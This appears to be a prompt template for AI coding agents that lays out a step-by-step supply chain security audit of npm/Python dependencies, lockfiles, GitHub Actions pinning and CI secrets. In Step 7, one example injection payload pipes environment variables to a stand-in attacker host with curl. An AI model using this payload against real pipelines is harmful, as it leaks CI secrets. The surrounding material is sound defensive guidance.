# Prompt: Supply Chain Security Audit

## When to use this

Use this before launch, when inheriting a project, or after the Log4Shell-style supply chain attack has you worried about what's in your dependency tree. This covers the full supply chain: packages, build pipeline, and GitHub Actions.

## Works with

Cursor, Claude, GitHub Copilot, Windsurf, Cline, Aider

## Agent prompt

> Copy everything below this line and paste into your agent.

---

You are a security engineer conducting a supply chain security audit. Review the project's dependencies, build pipeline, and GitHub Actions configuration for supply chain risks.

**Step 1: Inventory the dependency tree**

```bash
# Count total dependencies (direct + transitive)
npm ls --all 2>/dev/null | wc -l
# or
pip freeze | wc -l

# List direct dependencies
cat package.json | python3 -m json.tool | grep -A 100 '"dependencies"'

# Check if lockfile is committed
ls package-lock.json yarn.lock pnpm-lock.yaml 2>/dev/null

# Check if npm ci is used (uses lockfile) vs npm install (can update)
cat .github/workflows/*.yml 2>/dev/null | grep "npm ci\|npm install"
```

**Step 2: Identify high-risk packages**

Look for packages with these characteristics:

```bash
# Packages with install scripts (run code on npm install — risk!)
cat package.json | node -e "
const p = JSON.parse(require('fs').readFileSync('/dev/stdin'));
const deps = {...(p.dependencies||{}), ...(p.devDependencies||{})};
console.log('Direct deps:', Object.keys(deps).length, 'packages');
"

# Check each package for install scripts
# (Ideally use: npx lockfile-lint --path package-lock.json --allowed-schemes "https:")
npm ls --all --json 2>/dev/null | node -e "
const data = JSON.parse(require('fs').readFileSync('/dev/stdin'));
// Look for packages with scripts.install or scripts.postinstall
" 2>/dev/null || echo "Run: npm audit"
```

Flag packages that:
- Have `install`, `postinstall`, or `preinstall` scripts
- Are maintained by a single developer with few GitHub stars
- Have a name similar to a popular package (typosquatting check)
- Were installed recently without documented reason

**Step 3: Run vulnerability scans**

```bash
# npm
npm audit --json > supply-chain-audit.json
npm audit --audit-level=high  # fail on high

# Python
pip install pip-audit
pip-audit -r requirements.txt

# OSV Scanner (covers multiple ecosystems)
# Install: https://github.com/google/osv-scanner
osv-scanner -r . 2>/dev/null || echo "OSV Scanner not installed"

# Snyk (if token configured)
npx snyk test 2>/dev/null || echo "Snyk not configured"
```

**Step 4: Audit GitHub Actions for supply chain risks**

```bash
# Find all uses: statements
grep -rn "uses:" .github/workflows/

# Find UNPINNED actions (should use commit SHA, not tag)
grep -rn "uses:" .github/workflows/ | grep -v "@[a-f0-9]\{40\}"
```

For each unpinned action, find the commit SHA:

```bash
# Example: pin actions/checkout@v4 to a commit SHA
# 1. Go to github.com/actions/checkout/releases
# 2. Find the v4 release and note the commit SHA
# 3. Replace: uses: actions/checkout@v4
# with: uses: actions/checkout@abc123... # v4.1.1

# Use a tool to auto-pin:
npx pin-github-action .github/workflows/*.yml
```

**Step 5: Check for typosquatting**

Compare your package list against common typosquatting patterns:

```bash
# Extract all dependency names
cat package.json | node -e "
const p = JSON.parse(require('fs').readFileSync('/dev/stdin'));
const all = {...(p.dependencies||{}), ...(p.devDependencies||{})};
Object.keys(all).forEach(name => console.log(name));
"
```

Manually check any packages that look like they might be:
- One character off from a popular package (e.g., `expres` vs `express`)
- Using different casing (`React` vs `react`)
- Adding/removing a common word (`lodash-utils` vs `lodash`)

**Step 6: Verify lockfile integrity**

```bash
# Check that lockfile is committed and up to date
git status package-lock.json

# Verify the lockfile wasn't tampered with
# npm ci will fail if package.json and lockfile are out of sync
npm ci --dry-run 2>&1 | head -5

# Check for unexpected changes to lockfile in recent commits
git log --oneline -10 -- package-lock.json
```

**Step 7: Audit CI/CD secrets and permissions**

```bash
# Find secrets used in workflows
grep -rn "secrets\." .github/workflows/ | grep -v "^#"

# Check workflow permissions
grep -rn "permissions:" .github/workflows/
```

For each secret:
- Is it scoped to only the jobs that need it?
- Is the `env:` variable name different from the secret name (reduces confusion)?
- Are secrets used in `run:` with user-controlled input? (script injection risk)

```yaml
# VULNERABLE — secret exposed via GitHub event data
- run: echo ${{ github.event.pull_request.title }}  # PR title is user-controlled
  env:
    SECRET: ${{ secrets.MY_SECRET }}

# The PR title could contain: "; env | curl attacker.com -d @-"
```

**Step 8: Check for `--ignore-scripts` usage**

```bash
# In CI, dependencies should be installed with --ignore-scripts
grep -rn "npm install\|npm ci" .github/workflows/ | grep -v "ignore-scripts"
```

If `--ignore-scripts` is not used in CI, any package's install script runs with the permissions of the CI runner — a common supply chain attack vector.

**Step 9: Produce the audit report**

| Category | Status | Finding | Risk | Action |
|----------|--------|---------|------|--------|
| Vulnerability scan | FAIL | 2 high CVEs | High | Upgrade affected packages |
| Lockfile committed | PASS | package-lock.json present | — | ✓ |
| Actions pinned | FAIL | 5 unpinned actions | Medium | Pin to commit SHAs |
| install scripts | WARN | 3 packages with postinstall | Medium | Review scripts |
| npm ci in CI | FAIL | npm install used | Medium | Change to npm ci |

Implement fixes for all High and Medium findings.

---

## What to expect

A complete supply chain audit: vulnerability scan results, pinned GitHub Actions, lockfile integrity verified, install scripts reviewed, and CI/CD pipeline hardened.

## Learn more

[Supply Chain Security README](../README.md)
[CVE Awareness](../../04-cve-awareness/README.md)
[OWASP A06: Vulnerable Components](../../02-owasp/web-top10/A06-vulnerable-components.md)
[Security Scan GitHub Action](../../templates/github-actions/security-scan.yml)
